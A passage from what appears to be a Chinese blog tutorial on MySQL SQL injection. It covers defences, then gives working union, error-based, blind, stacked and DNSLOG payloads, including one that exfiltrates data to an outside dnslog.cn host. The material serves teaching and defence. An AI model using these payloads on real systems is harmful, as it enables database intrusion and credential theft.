<code>from</code> <code>where</code> <code>sub</code> <code>if</code> <code>union</code> <code>sleep</code> <code>and</code> <code>or</code> …</li></ul><h3 id="交互控制"><a href="#交互控制" class="headerlink" title="交互控制"></a>交互控制</h3><p>所有与数据库有交互的位置都进行预编译处理，又名参数化查询。使用占位符在查询语句中占位，再在语句真正执行时才提供变量，从而规避 SQL 语句的注入并且因为语句编译一次就可以多次执行，还可以提高效率。</p><p>技术层面有客户端预编译和服务端预编译，如 java 中的 jdbc 就同时提供了客户端预编译和服务端预编译。</p><p>服务端预编译示例(mysql.version&gt;4.1)：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 原语句</span><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> vuls_user <span class="token keyword">where</span> <span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token operator">=</span>$username<span class="token punctuation">;</span><span class="token comment"># 服务端预编译写法</span><span class="token keyword">prepare</span> <span class="token punctuation">`</span>prepared_query<span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token string">'select `id`,`username`,`role` from vuls_user where `username`=?'</span><span class="token punctuation">;</span><span class="token keyword">set</span> <span class="token variable">@username</span> <span class="token operator">=</span> <span class="token string">'admin'</span><span class="token punctuation">;</span><span class="token keyword">execute</span> <span class="token punctuation">`</span>prepared_query<span class="token punctuation">`</span> <span class="token keyword">using</span> <span class="token variable">@username</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="统一编码格式"><a href="#统一编码格式" class="headerlink" title="统一编码格式"></a>统一编码格式</h3><p>全部使用 UTF-8 编码，避免因上下层编码不一致导致一些过滤模型被绕过，比如宽字节注入等。</p><h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><p>遵循最小化权限原则，严格限制网站用户的数据库的操作权限，禁止<strong>高权限帐户</strong>（sa，dba、root 等）用于应用程序数据库访问，并且如果数据库是在服务器上手动安全，建议使用普<strong>通用户启动</strong>，从而最大限度的减少注入攻击对数据库的危害。</p><h3 id="禁用敏感函数"><a href="#禁用敏感函数" class="headerlink" title="禁用敏感函数"></a>禁用敏感函数</h3><p>防止攻击者通过 SQL 注入获取到除数据库外的其他更高权限，如系统权限等。</p><p>比如 MSSQL 中，拒绝用户访问敏感的系统存储过程，如<code>xp_dirtree</code>、<code>xp_cmdshell</code>等。</p><h3 id="全局异常拦截"><a href="#全局异常拦截" class="headerlink" title="全局异常拦截"></a>全局异常拦截</h3><p>避免泄露 db 报错信息等，防止被二次利用。</p><h2 id="常见数据库总结"><a href="#常见数据库总结" class="headerlink" title="常见数据库总结"></a>常见数据库总结</h2><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><table><thead><tr><th>大类</th><th>类别</th><th>说明</th><th>数据库</th></tr></thead><tbody><tr><td>SQL</td><td>关系数据库</td><td>“表-记录”模型</td><td>MySQL、MSSQL、Oracle、PostgreSQL…</td></tr><tr><td>NoSQL</td><td>文档数据库</td><td>无固定结构，不同的记录允许有不同的列数和列类型。列允许包含多值，记录允许嵌套</td><td>MongoDB、Amazon DynamoDB</td></tr><tr><td>NoSQL</td><td>搜索引擎</td><td>存储的目的是为了搜索</td><td>Elasticsearch</td></tr><tr><td>NoSQL</td><td>键-值数据库</td><td>“键-值”模型，是最简单的数据库管理系统</td><td>Redis、Memcached</td></tr><tr><td>…</td><td></td><td></td><td></td></tr></tbody></table><p><strong>本文只讨论 SQL 注入，暂不提及 NoSQL 的注入</strong></p><h3 id="开发语言与数据的常见搭配"><a href="#开发语言与数据的常见搭配" class="headerlink" title="开发语言与数据的常见搭配"></a>开发语言与数据的常见搭配</h3><table><thead><tr><th>开发语言</th><th>数据库</th></tr></thead><tbody><tr><td>asp</td><td>mssql、access</td></tr><tr><td>aspx</td><td>mssql</td></tr><tr><td>php</td><td>mysql、postgresql</td></tr><tr><td>java</td><td>mysql、oracle、mssql</td></tr></tbody></table><h3 id="数据库默认端口"><a href="#数据库默认端口" class="headerlink" title="数据库默认端口"></a>数据库默认端口</h3><table><thead><tr><th>数据库</th><th>端口</th></tr></thead><tbody><tr><td>oracle</td><td>1521</td></tr><tr><td>mssql</td><td>1433</td></tr><tr><td>mysql</td><td>3306</td></tr><tr><td>postgresql</td><td>5432</td></tr></tbody></table><h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><p>以 MySQL 为例。部分业务场景模拟并不符合业务场景，以攻击者的角度体会每种注入的利用条件即可。</p><h3 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h3><h4 id="SQL-语句"><a href="#SQL-语句" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> id <span class="token operator">=</span>{user_id}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221008233252822.png"></p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009000610782.png"></p><blockquote><p>在使用联合查询时第一条语句没有结果返回才会返回第二条语句的结果，并且需要保证两条语句的列数相同。</p><p>因此这里的 payload 我们需要先使用-1 使得第一条语句查询无结果，并且通过 fuzz 判断出列数，再通过查询出需要的库名、表名、列名等关键信息才能利用。</p></blockquote><h4 id="真正执行的-SQL-语句"><a href="#真正执行的-SQL-语句" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token punctuation">`</span>password<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>在 SQL 语句执行过程中发生报错会将错误信息通过接口返回。</p><h4 id="SQL-语句-1"><a href="#SQL-语句-1" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'{username}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>通过用户提交的 username 查询用户是否在存在，但没有回显。(这里业务貌似模拟的不太好…)</p><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009002018630.png"></p><h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1) and '</span><span class="token number">1</span><span class="token string">'='</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009002103640.png"></p><h4 id="真正执行的-SQL-语句-1"><a href="#真正执行的-SQL-语句-1" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h4><ul><li><p>floor()</p></li><li><p>extractValue()</p></li><li><p>updatexml()</p></li><li><p>exp()</p></li><li><p>name_const()</p></li><li><p>json using<br>原理</p></li><li><p>GTID 相关函数</p></li><li><p>ST 相关函数</p></li><li><p>几何函数</p></li><li><p>BIGINT</p></li><li><p>uuid 相关函数</p></li><li><p>不存在的函数</p></li></ul><h4 id="payload-总结"><a href="#payload-总结" class="headerlink" title="payload 总结"></a>payload 总结</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># floor 利用数据库表主键不能重复的原理，使用GROPU BY分组，产生主键key冗余，导致报错</span><span class="token number">1</span><span class="token string">' AND (SELECT 1 from(SELECT count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x)as y) -- -# extractValue Xpath格式语法书写错误的话，就会报错1'</span> <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1# updatexml Xpath格式语法书写错误的话，就会报错1'</span> <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">mid</span><span class="token punctuation">(</span>concat<span class="token punctuation">(</span><span class="token number">0x23</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1# exp e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错1'</span> <span class="token operator">and</span> exp<span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">and</span> <span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1# name_const mysql列名重复会导致报错,通过name_const制造一个列，配合笛卡尔积查询得到列名1'</span> <span class="token operator">AND</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> name_const<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>name_const<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span> <span class="token comment">-- -</span><span class="token comment"># json using 系统关键词join可建立两个表之间的内连接。通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误，并且报错信息会存在重复的列名，在知道数据库跟表名的情况下使用才可以爆字段</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> 表名 a <span class="token keyword">join</span> 表名 b <span class="token keyword">using</span> <span class="token punctuation">(</span>已知的字段<span class="token punctuation">,</span>已知的字段<span class="token punctuation">)</span> c<span class="token punctuation">)</span><span class="token comment"># GTID相关函数 参数格式不正确</span><span class="token keyword">select</span> GTID_SUBSET<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> GTID_SUBTRACT<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># ST相关函数 参数格式不正确</span><span class="token keyword">select</span> ST_LatFromGeoHash<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> ST_LongFromGeoHash<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> ST_PointFromGeoHash<span class="token punctuation">(</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 几何函数 函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># BIGINT 当mysql数据库的某些边界数值进行数值运算时，会产生报错。如~0得到的结果：18446744073709551615，若此数参与运算，则很容易会错误</span><span class="token keyword">select</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a<span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">~</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment"># uuid相关函数 参数格式不正确会导致报错。</span><span class="token keyword">select</span> uuid_to_bin<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">select</span> bin_to_uuid<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment"># 不存在的函数 mysql列名重复会导致报错,通过name_const制造一个列，配合笛卡尔积查询得到列名，仅可取数据库版本信息</span><span class="token keyword">select</span> a<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="bool-盲注"><a href="#bool-盲注" class="headerlink" title="bool 盲注"></a>bool 盲注</h3><blockquote><p>盲注的一种</p></blockquote><h4 id="SQL-语句-2"><a href="#SQL-语句-2" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'{username}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="业务逻辑-1"><a href="#业务逻辑-1" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>通过查询出的 role，判断并返回 username 是否为 admin。</p><h4 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009180509457.png"></p><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">' and if(substring((select user()),1,1)='</span>r'<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009181634152.png"></p><h4 id="真正执行的-SQL-语句-2"><a href="#真正执行的-SQL-语句-2" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><blockquote><p>盲注的一种</p></blockquote><h4 id="SQL-语句-3"><a href="#SQL-语句-3" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'{username}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="业务逻辑-2"><a href="#业务逻辑-2" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>查询当前用户是否存在，但没有结果返回，也不会返回数据库的错误信息。即早 bool 盲注的前提下去掉了回显。</p><h4 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009182043904.png"></p><h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' or if(substring((select user()),1,1)='</span>r'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009182502112.png"></p><h4 id="真正执行的-sql-语句"><a href="#真正执行的-sql-语句" class="headerlink" title="真正执行的 sql 语句"></a>真正执行的 sql 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'1'</span> <span class="token operator">or</span> <span class="token keyword">if</span><span class="token punctuation">(</span>substring<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><h4 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h4><p>服务端允许一次执行多条 SQL 语句，但如果条件满足，与三大注入(联合查询注入、盲注、报错注入)做优先级比较，应该是联合查询注入&gt;堆叠注入&gt;报错注入&gt;盲注</p><h4 id="SQL-语句-4"><a href="#SQL-语句-4" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> id <span class="token operator">=</span>{user_id}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="示例-4"><a href="#示例-4" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009183806336.png"></p><h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009182951875.png"></p><h4 id="真正执行的-SQL-语句-3"><a href="#真正执行的-SQL-语句-3" class="headerlink" title="真正执行的 SQL 语句"></a>真正执行的 SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span>id<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>username<span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token punctuation">`</span>role<span class="token punctuation">`</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="DNSLOG-注入"><a href="#DNSLOG-注入" class="headerlink" title="DNSLOG 注入"></a>DNSLOG 注入</h3><blockquote><p>在 Windows 中，路径以\开头的路径在 Windows 中被定义为 UNC 路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows 会先进行 DNS 查询。但是对于 Linux 来说，并没有这一标准，所以 DNSLOG 在 Linux 环境不适用。简单理解这个功能就像连接打印机需要输入<code>\\domain.com</code> ，此时就会发起一次 dns 解析。</p></blockquote><h4 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h4><p>服务端为 windows，且 mysql 配置项中的 secure_file_priv 不为 null，但如果条件满足，与三大注入(联合查询注入、盲注、报错注入)做优先级比较，应该是联合查询注入&gt;报错注入&gt;DNSLOG 注入&gt;盲注</p><h4 id="SQL-语句-5"><a href="#SQL-语句-5" class="headerlink" title="SQL 语句"></a>SQL 语句</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> {MySQLTable<span class="token punctuation">.</span>VULS_USER} <span class="token keyword">where</span> username <span class="token operator">=</span><span class="token string">'{username}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="业务逻辑-3"><a href="#业务逻辑-3" class="headerlink" title="业务逻辑"></a>业务逻辑</h4><p>与时间盲注相同，查询用户是否存在，但无回显。</p><h4 id="示例-5"><a href="#示例-5" class="headerlink" title="示例"></a>示例</h4><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009183836061.png"></p><h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">admin<span class="token string">'+union+SELECT+LOAD_FILE(CONCAT('</span>\\\\'<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">SELECT</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'.d8dzzu.dnslog.cn\\abc'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/outlaws-bai/picture/main/img/image-20221009184206469.png"></p><h4 id="真正执行的-SQL-语句-4"><a 